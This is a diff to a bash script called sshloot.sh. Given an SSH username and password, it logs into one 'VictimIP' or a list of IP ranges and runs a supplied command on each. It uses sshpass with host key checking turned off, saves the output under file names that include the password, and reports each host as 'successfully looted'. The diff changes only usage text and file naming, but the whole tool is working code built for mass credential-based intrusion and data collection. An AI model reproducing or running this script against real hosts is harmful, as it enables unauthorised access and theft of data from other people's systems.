@@ -12,9 +12,9 @@ if [ $# -ne 10 ]
 	echo " ./sshloot.sh [options] "
 	echo "	-u <SSH_User> "
 	echo "  -p <SSH_Pass> "
-	echo "	-i <VictimIP> OR -I <VictimIP-Range-file "
+	echo "	-i <VictimIP> OR -I <VictimIP-Range-file> "
 	echo "	-d <Local_dir_to_copy_to> "
-	echo " <command desc "
+	echo " <command desc> "
 	echo " <command> "
 	exit;
 fi
@@ -28,14 +28,14 @@ then
 	IP=$6
 	if nc -w 5 -z $IP 22
 	then
-		sshpass -p $p ssh -q -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null $u@$IP ${10} > $IP-$p-$9
+		sshpass -p $p ssh -q -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null $u@$IP ${10} > $IP-$u-$p-$9
 
-		if [ -s $IP-$p-$9 ]
+		if [ -s $IP-$u-$p-$9 ]
 		then
 			printf ""$IP" successfully looted"
 			printf '\n'
 		else
-			rm $IP-$p-$9
+			rm $IP-$u-$p-$9
 		fi
 	else
 		printf ""$IP": could not connect\n"
@@ -49,14 +49,14 @@ then
 	do
 		if  nc -w 5 -z $IP 22
 		then
-        		sshpass -p $p ssh -q -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null $u@$IP ${10} > $IP-$p-$9
+        		sshpass -p $p ssh -q -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null $u@$IP ${10} > $IP-$u-$p-$9
 
-			if [ -s $IP-$p-$9 ]
+			if [ -s $IP-$u-$p-$9 ]
 	                then
 	       	                printf ""$IP" successfully looted"
                 	        printf '\n'
 	                else
-       		                rm $IP-$p-$9
+       		                rm $IP-$u-$p-$9
                 	fi
 
 		else
